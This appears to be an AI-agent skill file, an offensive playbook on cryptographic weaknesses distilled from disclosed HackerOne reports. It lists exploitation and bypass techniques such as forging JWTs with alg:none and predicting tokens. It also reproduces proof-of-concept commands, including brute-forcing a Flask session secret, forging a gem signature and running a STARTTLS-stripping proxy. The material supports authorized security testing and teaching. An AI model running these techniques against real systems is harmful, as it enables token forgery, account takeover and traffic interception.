---
name: crypto-weakness
description: "Cryptographic Weaknesses offensive playbook from 49 disclosed HackerOne reports (12 high, 25 medium, 12 low). Use when hunting or reviewing cryptographic weaknesses. Triggers: attacker, password, allowed, access, node.js."
license: "For authorized security testing and education only."
---

# Cryptographic Weaknesses

> Distilled from **49** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Broken or misused cryptography  -  weak/predictable randomness, broken algorithms, unverified signatures, nonce reuse, forgeable/`alg:none` JWTs.

## Where to hunt

- Examine token/ID generation for predictability, signature checks for gaps, and algorithm choices; test JWT `alg` confusion and signature stripping.

## Exploitation playbook

- Predict reset/session tokens from weak PRNG or timestamps.
- Forge JWTs via `alg:none`, HS/RS confusion, or a leaked/weak secret; bypass unverified signatures.

## Bypass techniques

- Downgrade/strip signatures, exploit non-constant-time comparisons, reuse nonces/IVs.

## Impact & escalation

- Token forgery → authentication bypass / account takeover.

## Remediation

- Use vetted libraries, CSPRNGs, authenticated encryption, strict signature+algorithm verification, and high-entropy secrets.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#1387366](https://hackerone.com/reports/1387366)  -  elections.k8s.io uses weak session secret key, may place elections …
*high, $250*

```
% curl https://elections.k8s.io -Is | grep cookie
set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.YX-V3g.NET76NNJbweb_qagyfYl2_7TDJg; Expires=Thu, 02 Dec 2021 07:23:10 GMT; HttpOnly; Path=/

% flask-unsign -u -c "eyJfcGVybWFuZW50Ijp0cnVlfQ.YX-V3g.NET76NNJbweb_qagyfYl2_7TDJg"
[*] Session decodes to: {'_permanent': True}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 8192 attemptspdcQHNyXaB0O
'N/A'
```

### 2. [#1039504](https://hackerone.com/reports/1039504)  -  Some build dependencies are downloaded over an insecure channel (wi…
*high, $100*

```shell
download_tap_windows () {
    if [ ! -f "download-cache/tap-windows-${TAP_WINDOWS_VERSION}.zip" ]; then
       wget -P download-cache/ \
           "http://build.openvpn.net/downloads/releases/tap-windows-${TAP_WINDOWS_VERSION}.zip"
    fi
}

download_lzo () {
    if [ ! -f "download-cache/lzo-${LZO_VERSION}.tar.gz" ]; then
        wget -P download-cache/ \
            "http://www.oberhumer.com/opensource/lzo/download/lzo-${LZO_VERSION}.tar.gz"
    fi
}
```

### 3. [#275269](https://hackerone.com/reports/275269)  -  Gem signature forgery
*medium, $1,000*

```bash
$ gem --version
2.5.2
$ wget https://raw.githubusercontent.com/intridea/multi_json/master/certs/rwz.pem
$ gem cert --add rwz.pem
Added '/CN=pavel/DC=pravosud/DC=com'
$ gem install --install-dir install -P HighSecurity multi_json-1.12.2.gem
Successfully installed multi_json-1.12.2
1 gem installed
$ ls install/gems/multi_json-1.12.2/
HACKED
```

### 4. [#275269](https://hackerone.com/reports/275269)  -  Gem signature forgery
*medium, $1,000*

```bash
$ gem fetch multi_json
$ mkdir orig
$ mv multi_json-1.12.2.gem orig/
$ echo hacked > HACKED
$ tar czf data.tar.gz HACKED
$ ./forge-gem.sh orig/multi_json-1.12.2.gem data.tar.gz forged.gem
```

### 5. [#1178562](https://hackerone.com/reports/1178562)  -  imap: StartTLS stripping attack (CVE-2016-0772).
*medium*

```bash
$  python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError
2021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> client ('127.0.0.1', 39154) has connected
2021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> connecting to target ('imap.yandex.ru', 143)
2021-04-28 18:43:27,347 - DEBUG    - <Session 0x7fd5850b3c10> [client] <= [server]          '* OK Yandex IMAP4rev1 at myt3-8d2078fedea5.qloud-c.yandex.net:143 ready to talk with ::ffff:188.138.209.162:62549, 2021-Apr-28 18:43:52, qheZ7J3friE1\r\n'
2021-04-28 18:43:27,348 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.StripWithError new: True>
2021-04-28 18:43:27,348 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server]          'RUBY0001 STARTTLS\r\n'
2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] <= [server][mangled] 'RUBY0001 BUG unhandled command\r\n'
2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server][mangled] None
2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server]          'RUBY0002 LOGIN myLOGIN myPASSWORD\r\n'
...
```

### 6. [#1557449](https://hackerone.com/reports/1557449)  -  CVE-2022-30115: HSTS bypass via trailing dot
*medium*

```bash
curl --hsts hsts.txt http://accounts.google.com.
```

More payloads: see [payloads.md](payloads.md) (16 curated).

## Recurring patterns in this dataset

Most frequent terms across the 49 reports (term (count)): `attacker` (19), `password` (15), `allowed` (12), `access` (12), `node.js` (12), `email` (10), `potentially` (10), `address` (9), `library` (9), `openssl` (9), `cryptographic` (8), `discovered` (8), `attack` (7), `random` (7), `found` (7), `weak` (7), `openssl.cnf` (7), `error` (7)

## Worked example  -  [report #531032](https://hackerone.com/reports/531032)

*Slack DTLS uses a private key that is in the public domain, which may lead to SRTP stream hijack* (high, $2,000)

> - Affects: Janus DTLS certificate Description The Janus server in use by Slack is configured using a certificate and private key that were previously distributed by default. This certificate is used to authenticate the DTLS connection which is later used to exchange keys for the SRTP stream. As a result, the confidentiality of the WebRTC call over Slack cannot be ensured. How to reproduce the issue 1. Start Wireshark and set a display filter for stun 2. In the web browser, open about:webrtc-internals 3. Start a call on Slack 4. Observe the packets containing the string rainmaker which would be part of the DTLS certificate 5. Notice that the SetRemoteDescription fingerprint in the about:webrt…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#531032](https://hackerone.com/reports/531032) | high | $2,000 | slack | Slack DTLS uses a private key that is in the public domain, which may lead to SRTP stre… |
| [#3800870](https://hackerone.com/reports/3800870) | high | $1,337 | 8x8-bounty | connect.8x8.com/api/v1: JWT Algorithm Confusion Vulnerability |
| [#213437](https://hackerone.com/reports/213437) | high | $1,000 | ibb | Critical vulnerability in JSON Web Encryption (JWE) - RFC 7516 Invalid Curve attack |
| [#505007](https://hackerone.com/reports/505007) | high | $280 | x | [Twitter Open Source] Releases were & are built/executed/tested/released in the context… |
| [#1387366](https://hackerone.com/reports/1387366) | high | $250 | kubernetes | elections.k8s.io uses weak session secret key, may place elections at risk |
| [#1039504](https://hackerone.com/reports/1039504) | high | $100 | ibb | Some build dependencies are downloaded over an insecure channel (without subsequent int… |
| [#2142109](https://hackerone.com/reports/2142109) | high |  -  | mars | 0 Click account takeover via timed requests to ███████forgot-password (single-packet at… |
| [#3131758](https://hackerone.com/reports/3131758) | high |  -  | nodejs | HashDoS in V8 |

*See [reference.md](reference.md) for all 49 reports in this class.*
